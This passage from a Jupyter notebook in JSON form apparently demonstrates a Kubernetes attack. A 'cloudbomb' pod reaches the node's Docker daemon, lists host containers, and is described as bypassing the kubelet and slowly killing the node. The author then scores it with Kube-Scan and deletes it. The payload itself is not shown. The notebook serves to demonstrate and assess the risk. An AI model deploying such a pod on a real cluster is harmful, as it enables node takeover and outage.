      "591580bd91f1        k8s.gcr.io/pause:3.5          \"/pause\"                 57 minutes ago       Up 57 minutes                           k8s_POD_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "5712a32ddb12        k8s.gcr.io/pause:3.5          \"/pause\"                 57 minutes ago       Up 57 minutes                           k8s_POD_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "612d18f433bd        6e38f40d628d                  \"/storage-provisioner\"   6 hours ago          Up 6 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "65793eecdde3        8d147537fb7d                  \"/coredns -conf /etc…\"   6 hours ago          Up 6 hours                              k8s_coredns_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "f915b870ee6b        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "72c6ee947db8        873127efbc8a                  \"/usr/local/bin/kube…\"   6 hours ago          Up 6 hours                              k8s_kube-proxy_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "ed853a4bf5d0        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "cfa9996f98c4        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "b3473922bbe4        5425bcbd23c5                  \"kube-controller-man…\"   6 hours ago          Up 6 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "fc75fd7aba15        004811815584                  \"etcd --advertise-cl…\"   6 hours ago          Up 6 hours                              k8s_etcd_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "3cab011b2934        b51ddc1014b0                  \"kube-scheduler --au…\"   6 hours ago          Up 6 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "c305e0932e5a        e64579b7d886                  \"kube-apiserver --ad…\"   6 hours ago          Up 6 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "fd8093a82c02        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "b2787fd72074        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "654ee9f65305        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "286180e64eaa        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED              STATUS              PORTS               NAMES\n",
      "24071c9d6ae1        k8s.gcr.io/pause:3.5          \"/pause\"                 About a minute ago   Up About a minute                       k8s_POD_kube-scan-db6ffdfd5-qdt94_kube-scan_0f0a7470-c89c-405a-a6f6-9775db49a20a_0\n",
      "9262dd397bc2        0fa6bb93d0d3                  \"/bin/sh -c 'while t…\"   2 minutes ago        Up 2 minutes                            k8s_cloudbomb_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "287b97245b66        k8s.gcr.io/pause:3.5          \"/pause\"                 2 minutes ago        Up 2 minutes                            k8s_POD_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "30e8fbea03ed        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   57 minutes ago       Up 57 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "e8f2365a91c4        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   57 minutes ago       Up 57 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "4cc66f2b2f06        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   57 minutes ago       Up 57 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "a1bcbbaf5301        k8s.gcr.io/pause:3.5          \"/pause\"                 57 minutes ago       Up 57 minutes                           k8s_POD_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "591580bd91f1        k8s.gcr.io/pause:3.5          \"/pause\"                 57 minutes ago       Up 57 minutes                           k8s_POD_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "5712a32ddb12        k8s.gcr.io/pause:3.5          \"/pause\"                 57 minutes ago       Up 57 minutes                           k8s_POD_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "612d18f433bd        6e38f40d628d                  \"/storage-provisioner\"   6 hours ago          Up 6 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "65793eecdde3        8d147537fb7d                  \"/coredns -conf /etc…\"   6 hours ago          Up 6 hours                              k8s_coredns_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "f915b870ee6b        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "72c6ee947db8        873127efbc8a                  \"/usr/local/bin/kube…\"   6 hours ago          Up 6 hours                              k8s_kube-proxy_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "ed853a4bf5d0        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "cfa9996f98c4        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "b3473922bbe4        5425bcbd23c5                  \"kube-controller-man…\"   6 hours ago          Up 6 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "fc75fd7aba15        004811815584                  \"etcd --advertise-cl…\"   6 hours ago          Up 6 hours                              k8s_etcd_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "3cab011b2934        b51ddc1014b0                  \"kube-scheduler --au…\"   6 hours ago          Up 6 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "c305e0932e5a        e64579b7d886                  \"kube-apiserver --ad…\"   6 hours ago          Up 6 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "fd8093a82c02        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "b2787fd72074        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "654ee9f65305        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "286180e64eaa        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED              STATUS              PORTS               NAMES\n",
      "24071c9d6ae1        k8s.gcr.io/pause:3.5          \"/pause\"                 About a minute ago   Up About a minute                       k8s_POD_kube-scan-db6ffdfd5-qdt94_kube-scan_0f0a7470-c89c-405a-a6f6-9775db49a20a_0\n",
      "9262dd397bc2        0fa6bb93d0d3                  \"/bin/sh -c 'while t…\"   2 minutes ago        Up 2 minutes                            k8s_cloudbomb_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "287b97245b66        k8s.gcr.io/pause:3.5          \"/pause\"                 2 minutes ago        Up 2 minutes                            k8s_POD_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "30e8fbea03ed        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   57 minutes ago       Up 57 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "e8f2365a91c4        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   57 minutes ago       Up 57 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "4cc66f2b2f06        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   57 minutes ago       Up 57 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "a1bcbbaf5301        k8s.gcr.io/pause:3.5          \"/pause\"                 57 minutes ago       Up 57 minutes                           k8s_POD_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "591580bd91f1        k8s.gcr.io/pause:3.5          \"/pause\"                 57 minutes ago       Up 57 minutes                           k8s_POD_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "5712a32ddb12        k8s.gcr.io/pause:3.5          \"/pause\"                 57 minutes ago       Up 57 minutes                           k8s_POD_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "612d18f433bd        6e38f40d628d                  \"/storage-provisioner\"   6 hours ago          Up 6 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "65793eecdde3        8d147537fb7d                  \"/coredns -conf /etc…\"   6 hours ago          Up 6 hours                              k8s_coredns_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "f915b870ee6b        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "72c6ee947db8        873127efbc8a                  \"/usr/local/bin/kube…\"   6 hours ago          Up 6 hours                              k8s_kube-proxy_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "ed853a4bf5d0        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "cfa9996f98c4        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "b3473922bbe4        5425bcbd23c5                  \"kube-controller-man…\"   6 hours ago          Up 6 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "fc75fd7aba15        004811815584                  \"etcd --advertise-cl…\"   6 hours ago          Up 6 hours                              k8s_etcd_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "3cab011b2934        b51ddc1014b0                  \"kube-scheduler --au…\"   6 hours ago          Up 6 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "c305e0932e5a        e64579b7d886                  \"kube-apiserver --ad…\"   6 hours ago          Up 6 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "fd8093a82c02        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "b2787fd72074        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "654ee9f65305        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "286180e64eaa        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED              STATUS              PORTS               NAMES\n",
      "24071c9d6ae1        k8s.gcr.io/pause:3.5          \"/pause\"                 About a minute ago   Up About a minute                       k8s_POD_kube-scan-db6ffdfd5-qdt94_kube-scan_0f0a7470-c89c-405a-a6f6-9775db49a20a_0\n",
      "9262dd397bc2        0fa6bb93d0d3                  \"/bin/sh -c 'while t…\"   3 minutes ago        Up 3 minutes                            k8s_cloudbomb_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "287b97245b66        k8s.gcr.io/pause:3.5          \"/pause\"                 3 minutes ago        Up 3 minutes                            k8s_POD_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "30e8fbea03ed        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   57 minutes ago       Up 57 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "e8f2365a91c4        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   57 minutes ago       Up 57 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "4cc66f2b2f06        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   57 minutes ago       Up 57 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "a1bcbbaf5301        k8s.gcr.io/pause:3.5          \"/pause\"                 57 minutes ago       Up 57 minutes                           k8s_POD_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "591580bd91f1        k8s.gcr.io/pause:3.5          \"/pause\"                 57 minutes ago       Up 57 minutes                           k8s_POD_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "5712a32ddb12        k8s.gcr.io/pause:3.5          \"/pause\"                 57 minutes ago       Up 57 minutes                           k8s_POD_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "612d18f433bd        6e38f40d628d                  \"/storage-provisioner\"   6 hours ago          Up 6 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "65793eecdde3        8d147537fb7d                  \"/coredns -conf /etc…\"   6 hours ago          Up 6 hours                              k8s_coredns_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "f915b870ee6b        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "72c6ee947db8        873127efbc8a                  \"/usr/local/bin/kube…\"   6 hours ago          Up 6 hours                              k8s_kube-proxy_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "ed853a4bf5d0        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "cfa9996f98c4        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "b3473922bbe4        5425bcbd23c5                  \"kube-controller-man…\"   6 hours ago          Up 6 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "fc75fd7aba15        004811815584                  \"etcd --advertise-cl…\"   6 hours ago          Up 6 hours                              k8s_etcd_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "3cab011b2934        b51ddc1014b0                  \"kube-scheduler --au…\"   6 hours ago          Up 6 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "c305e0932e5a        e64579b7d886                  \"kube-apiserver --ad…\"   6 hours ago          Up 6 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "fd8093a82c02        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "b2787fd72074        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "654ee9f65305        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "286180e64eaa        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED              STATUS              PORTS               NAMES\n",
      "24071c9d6ae1        k8s.gcr.io/pause:3.5          \"/pause\"                 About a minute ago   Up About a minute                       k8s_POD_kube-scan-db6ffdfd5-qdt94_kube-scan_0f0a7470-c89c-405a-a6f6-9775db49a20a_0\n",
      "9262dd397bc2        0fa6bb93d0d3                  \"/bin/sh -c 'while t…\"   3 minutes ago        Up 3 minutes                            k8s_cloudbomb_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "287b97245b66        k8s.gcr.io/pause:3.5          \"/pause\"                 3 minutes ago        Up 3 minutes                            k8s_POD_cloudbomb_default_91a424dd-9a79-47dc-a939-f0d80b6e23ac_0\n",
      "30e8fbea03ed        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   57 minutes ago       Up 57 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "e8f2365a91c4        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   57 minutes ago       Up 57 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "4cc66f2b2f06        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   57 minutes ago       Up 57 minutes                           k8s_nginx_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "a1bcbbaf5301        k8s.gcr.io/pause:3.5          \"/pause\"                 57 minutes ago       Up 57 minutes                           k8s_POD_nginx-strict-5cdc48cf55-5gzxm_default_58a0653d-f423-413e-aa70-62c5f82b6b9d_0\n",
      "591580bd91f1        k8s.gcr.io/pause:3.5          \"/pause\"                 57 minutes ago       Up 57 minutes                           k8s_POD_nginx-strict-5cdc48cf55-lxc8w_default_a770a53d-4f08-4e4d-9ab8-9f90b21efe06_0\n",
      "5712a32ddb12        k8s.gcr.io/pause:3.5          \"/pause\"                 57 minutes ago       Up 57 minutes                           k8s_POD_nginx-strict-5cdc48cf55-wwqhs_default_9d0404a6-c607-4c99-87f2-b1510678d51d_0\n",
      "612d18f433bd        6e38f40d628d                  \"/storage-provisioner\"   6 hours ago          Up 6 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "65793eecdde3        8d147537fb7d                  \"/coredns -conf /etc…\"   6 hours ago          Up 6 hours                              k8s_coredns_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "f915b870ee6b        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_storage-provisioner_kube-system_b147672e-36fd-42d8-a691-2c3896f0f43b_0\n",
      "72c6ee947db8        873127efbc8a                  \"/usr/local/bin/kube…\"   6 hours ago          Up 6 hours                              k8s_kube-proxy_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "ed853a4bf5d0        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_coredns-78fcd69978-jtj8x_kube-system_e01e0c8b-f513-4822-983a-264e8326eeb1_0\n",
      "cfa9996f98c4        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-proxy-7zcnf_kube-system_89a16e01-0d20-4a29-b0a6-61dd2b391017_0\n",
      "b3473922bbe4        5425bcbd23c5                  \"kube-controller-man…\"   6 hours ago          Up 6 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "fc75fd7aba15        004811815584                  \"etcd --advertise-cl…\"   6 hours ago          Up 6 hours                              k8s_etcd_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n",
      "3cab011b2934        b51ddc1014b0                  \"kube-scheduler --au…\"   6 hours ago          Up 6 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "c305e0932e5a        e64579b7d886                  \"kube-apiserver --ad…\"   6 hours ago          Up 6 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "fd8093a82c02        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-scheduler-minikube_kube-system_97bca4cd66281ad2157a6a68956c4fa5_0\n",
      "b2787fd72074        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_4787f37e041fd890d5499a8863561e5f_0\n",
      "654ee9f65305        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_kube-apiserver-minikube_kube-system_fe49842e48a1ca6bac988e8ba88ecc53_0\n",
      "286180e64eaa        k8s.gcr.io/pause:3.5          \"/pause\"                 6 hours ago          Up 6 hours                              k8s_POD_etcd-minikube_kube-system_08a3871e1baa241b73e5af01a6d01393_0\n"
     ]
    }
   ],
   "source": [
    "kubectl logs cloudbomb"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Docker is 💩, let us use `cri-o`\n",
    "\n",
    "Doesn' solve the principle problem"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "jupyter": {
     "source_hidden": true
    },
    "tags": []
   },
   "source": [
    "## Docker vs Kubernetes\n",
    "\n",
    "The docker command bypasses Kubernetes. It is *not* visible to the `kubelet` and the `api-server`\n",
    "\n",
    "It will kill the node _s l o w l y_"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "docker ps | grep -E '$|.*BOOM.*$'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "jupyter": {
     "source_hidden": true
    },
    "tags": []
   },
   "source": [
    "## Kube-Scan\n",
    "\n",
    "Examine the pod with [Octarine Kube-Scan](https://github.com/octarinesec/kube-scan)\n",
    "\n",
    "Open a separate terminal window and run `minikube tunnel` in this terminal"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "collapsed": true,
    "jupyter": {
     "outputs_hidden": true,
     "source_hidden": true
    },
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "namespace/kube-scan created\n",
      "configmap/kube-scan created\n",
      "serviceaccount/kube-scan created\n",
      "clusterrole.rbac.authorization.k8s.io/kube-scan created\n",
      "clusterrolebinding.rbac.authorization.k8s.io/kube-scan created\n",
      "deployment.apps/kube-scan created\n",
      "service/kube-scan-ui created\n"
     ]
    }
   ],
   "source": [
    "kubectl apply -f https://raw.githubusercontent.com/octarinesec/kube-scan/master/kube-scan.yaml"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "error: timed out waiting for the condition on deployments/kube-scan\n"
     ]
    },
    {
     "ename": "",
     "evalue": "1",
     "output_type": "error",
     "traceback": []
    }
   ],
   "source": [
    "kubectl wait -n kube-scan --for=condition=available deployment/kube-scan"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "namespace/kube-scan unchanged\n",
      "configmap/kube-scan unchanged\n",
      "serviceaccount/kube-scan unchanged\n",
      "\u001b[33;1mWarning:\u001b[0m rbac.authorization.k8s.io/v1beta1 ClusterRole is deprecated in v1.17+, unavailable in v1.22+; use rbac.authorization.k8s.io/v1 ClusterRole\n",
      "clusterrole.rbac.authorization.k8s.io/kube-scan configured\n",
      "\u001b[33;1mWarning:\u001b[0m rbac.authorization.k8s.io/v1beta1 ClusterRoleBinding is deprecated in v1.17+, unavailable in v1.22+; use rbac.authorization.k8s.io/v1 ClusterRoleBinding\n",
      "clusterrolebinding.rbac.authorization.k8s.io/kube-scan configured\n",
      "deployment.apps/kube-scan unchanged\n",
      "service/kube-scan-ui configured\n"
     ]
    }
   ],
   "source": [
    "kubectl apply -f https://raw.githubusercontent.com/octarinesec/kube-scan/master/kube-scan-lb.yaml"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "http://10.96.201.143\n"
     ]
    }
   ],
   "source": [
    "echo http://$(kubectl -n kube-scan get service kube-scan-ui -o jsonpath={..ip})"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Risk Score\n",
    "\n",
    "Current 5, should be 8-9 \n",
    "\n",
    "I own the node, no network access"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Cleanup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "pod \"cloudbomb\" deleted\n"
     ]
    }
   ],
   "source": [
    "kubectl delete pod cloudbomb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "namespace \"kube-scan\" deleted\n",
      "configmap \"kube-scan\" deleted\n",
      "serviceaccount \"kube-scan\" deleted\n",
      "clusterrole.rbac.authorization.k8s.io \"kube-scan\" deleted\n",
      "clusterrolebinding.rbac.authorization.k8s.io \"kube-scan\" deleted\n",
      "deployment.apps \"kube-scan\" deleted\n",
      "service \"kube-scan-ui\" deleted\n",
      "namespace \"kube-scan\" deleted\n",
      "Error from server (NotFound): error when deleting \"https://raw.githubusercontent.com/octarinesec/kube-scan/master/kube-scan-lb.yaml\": configmaps \"kube-scan\" not found\n",
      "Error from server (NotFound): error when deleting \"https://raw.githubusercontent.com/octarinesec/kube-scan/master/kube-scan-lb.yaml\": serviceaccounts \"kube-scan\" not found\n",
      "Error from server (NotFound): error when deleting \"https://raw.githubusercontent.com/octarinesec/kube-scan/master/kube-scan-lb.yaml\": deployments.apps \"kube-scan\" not found\n",
      "Error from server (NotFound): error when deleting \"https://raw.githubusercontent.com/octarinesec/kube-scan/master/kube-scan-lb.yaml\": services \"kube-scan-ui\" not found\n",
